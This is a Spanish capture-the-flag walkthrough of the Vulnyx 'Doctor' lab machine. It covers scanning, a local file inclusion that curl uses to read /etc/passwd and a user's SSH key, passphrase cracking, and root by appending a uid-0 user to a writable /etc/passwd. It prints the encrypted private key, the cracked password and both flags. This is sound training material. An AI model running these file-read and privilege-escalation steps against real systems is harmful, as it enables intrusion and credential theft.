

Herramientas usadas:
[[ARP-Scan]]
[[Ping]]
[[NMAP]]
[[RSAcrack]]
[[Curl]]
[[Chmod]]



https://vulnyx.com/
Mirror: [mega.nz/file/Ie5w0JjJ#uVXwMBWLAQKc04metFBHozlPYfnXfYttuGU_7de_69M](https://mega.nz/file/Ie5w0JjJ#uVXwMBWLAQKc04metFBHozlPYfnXfYttuGU_7de_69M)

Mirror, download:
![[Vulnyx - Doctor - img.png]]


## Reconocimiento en la red
![[Vulnyx - Doctor - IP.png]]

sudo arp-scan -I eth0 --localnet

![[Vulnyx - Doctor - Arp-scan.png]]
IP: 192.168.1.139
Ping
![[Vulnyx - Doctor - Ping.png]]

TTL=64 --> Linux

# Reconocimiento

## Nmap

sudo nmap -sS -p- -Pn 192.168.1.139 
![[Vulnyx - Doctor - Nmap.png]]


Nmap Scrip
al 80:
sudo nmap --script "vuln" -p80 192.168.1.139
![[Vulnyx - Doctor - Nmap script 80.png]]


al 22:
sudo nmap --script "vuln" -p22 192.168.1.139

![[Vulnyx - Doctor - Nmap script 22.png]]


No encuentro nada en metasploit para atacar estas vulnerabilidades.
vemos la web que corre en el puerto 80:

![[Vulnyx - Doctor - Web default.png]]

Vamos a hacer ffuf para ver si encontramos algo interesante:


encontramos esta URL:
![[Vulnyx - Doctor - Web URL.png]]http://192.168.1.139/doctor-item.php?include=Doctors.html
y vemos que tiene un include:
le hacemos una peticion curl:
curl -s -X GET "http://192.168.1.139/doctor-item.php?include=/etc/passwd" 


![[Vulnyx - Doctor - curl + user.png]]


Usuario: admin
Conseguimos el id_rsa a través de curl:
curl -s -X GET "http://192.168.1.139/doctor-item.php?include=/home/admin/.ssh/id_rsa"

-----BEGIN RSA PRIVATE KEY-----
Proc-Type: 4,ENCRYPTED
DEK-Info: DES-EDE3-CBC,9FB14B3F3D04E90E

uuQm2CFIe/eZT5pNyQ6+K1Uap/FYWcsEklzONt+x4AO6FmjFmR8RUpwMHurmbRC6
hqyoiv8vgpQgQRPYMzJ3QgS9kUCGdgC5+cXlNCST/GKQOS4QMQMUTacjZZ8EJzoe
o7+7tCB8Zk/sW7b8c3m4Cz0CmE5mut8ZyuTnB0SAlGAQfZjqsldugHjZ1t17mldb
+gzWGBUmKTOLO/gcuAZC+Tj+BoGkb2gneiMA85oJX6y/dqq4Ir10Qom+0tOFsuot
b7A9XTubgElslUEm8fGW64kX3x3LtXRsoR12n+krZ6T+IOTzThMWExR1Wxp4Ub/k
HtXTzdvDQBbgBf4h08qyCOxGEaVZHKaV/ynGnOv0zhlZ+z163SjppVPK07H4bdLg
9SC1omYunvJgunMS0ATC8uAWzoQ5Iz5ka0h+NOofUrVtfJZ/OnhtMKW+M948EgnY
zh7Ffq1KlMjZHxnIS3bdcl4MFV0F3Hpx+iDukvyfeeWKuoeUuvzNfVKVPZKqyaJu
rRqnxYW/fzdJm+8XViMQccgQAaZ+Zb2rVW0gyifsEigxShdaT5PGdJFKKVLS+bD1
tHBy6UOhKCn3H8edtXwvZN+9PDGDzUcEpr9xYCLkmH+hcr06ypUtlu9UrePLh/Xs
94KATK4joOIW7O8GnPdKBiI+3Hk0qakL1kyYQVBtMjKTyEM8yRcssGZr/MdVnYWm
VD5pEdAybKBfBG/xVu2CR378BRKzlJkiyqRjXQLoFMVDz3I30RpjbpfYQs2Dm2M7
Mb26wNQW4ff7qe30K/Ixrm7MfkJPzueQlSi94IHXaPvl4vyCoPLW89JzsNDsvG8P
hrkWRpPIwpzKdtMPwQbkPu4ykqgKkYYRmVlfX8oeis3C1hCjqvp3Lth0QDI+7Shr
Fb5w0n0qfDT4o03U1Pun2iqdI4M+iDZUF4S0BD3xA/zp+d98NnGlRqMmJK+StmqR
IIk3DRRkvMxxCm12g2DotRUgT2+mgaZ3nq55eqzXRh0U1P5QfhO+V8WzbVzhP6+R
MtqgW1L0iAgB4CnTIud6DpXQtR9l//9alrXa+4nWcDW2GoKjljxOKNK8jXs58SnS
62LrvcNZVokZjql8Xi7xL0XbEk0gtpItLtX7xAHLFTVZt4UH6csOcwq5vvJAGh69
Q/ikz5XmyQ+wDwQEQDzNeOj9zBh1+1zrdmt0m7hI5WnIJakEM2vqCqluN5CEs4u8
p1ia+meL0JVlLobfnUgxi3Qzm9SF2pifQdePVU4GXGhIOBUf34bts0iEIDf+qx2C
pwxoAe1tMmInlZfR2sKVlIeHIBfHq/hPf2PHvU0cpz7MzfY36x9ufZc5MH2JDT8X
KREAJ3S0pMplP/ZcXjRLOlESQXeUQ2yvb61m+zphg0QjWH131gnaBIhVIj1nLnTa
i99+vYdwe8+8nJq4/WXhkN+VTYXndET2H0fFNTFAqbk2HGy6+6qS/4Q6DVVxTHdp
4Dg2QRnRTjp74dQ1NZ7juucvW7DBFE+CK80dkrr9yFyybVUqBwHrmmQVFGLkS2I/
8kOVjIjFKkGQ4rNRWKVoo/HaRoI/f2G6tbEiOVclUMT8iutAg8S4VA==
-----END RSA PRIVATE KEY-----

![[Vulnyx - Doctor - Id_RSA.png]]




lo guardamos en un fichero:
![[Vulnyx - Doctor - idRSAA in a file.png]]
le damos permisos de escritura y ejecucion al fichero
chmod +xw id_rsa

![[Vulnyx - Doctor - id_rsa file.png]]

ahora vamos a udar este fichero para conectar por ssh con el usuario admin

ssh -i id_rsa admin@192.168.1.139
pero nos sale el siguiente mensaje:
Permissions 0755 for 'id_rsa' are too open.
![[Vulnyx - Doctor - permissos incorrectos para el fichero.png]]
volvemos a cambiar los permisos al documento id_rsa:
chmod 600 id_rsa
![[Vulnyx - Doctor - change id_rsa permissions.png]]
y volvemos aintentar conectar:


![[Vulnyx - Doctor - Ssh connection key for id_rsa.png]]


clonamos esta herramienta de este repo:
git clone https://github.com/d4t4s3c/RSAcrack.git


![[Vulnyx - Doctor -  Cambiamos los permisos a RSAcrack.png]]
Le damos permiso de ejecucion a la herramienta y la ejecutamos

./RSAcrack -w /usr/share/wordlists/rockyou.txt -k {rsafile}

![[Vulnyx - Doctor - RSACrack.png]]
y encontramos una contraseña:
![[Vulnyx - Doctor - RSAcrack saca la contraseña.png]]

admin: unicornio
vovemos a intentar hacer el ssh y accedemos ocn la contraseña encontrada:
![[Vulnyx - Doctor - ssh access.png]]


user flag: 0819e6dfb35db7c61353e4dce311b397

![[Vulnyx - Doctor - User flag.png]]

# Escalada de privilegios

ejecutamols:
find / -writable -type f 2>/dev/null |grep '/etc/passwd' && ls -lah /etc/passwd

![[Vulnyx - Doctor - Escalada.png]]
Vemos que el archivo passwd es writeable:


para vulnerasr esto primer generamos una contraseña:
openssl passwd 123456


![[Vulnyx - Doctor - Genrate passrod.png]]

Luego lo agregamos al fichero passwd como root2
echo "root2:2quasw1hUYYNw:0:0;root:/root:/bin/bash" >> /etc/passwd
o mejor entramos con nano /etc/passwd y cambiamos la contraseña del root a mano:


![[Vulnyx - Doctor - Editar fichero passwd en etc.png]]

luego hacemos su y ponemos la contraseña que hemos creado : 123456
![[Vulnyx - Doctor - Root user.png]]

root flag: dfde8cc67ed8819b2386dc74e472ecc6

![[Vulnyx - Doctor - root falg.png]]
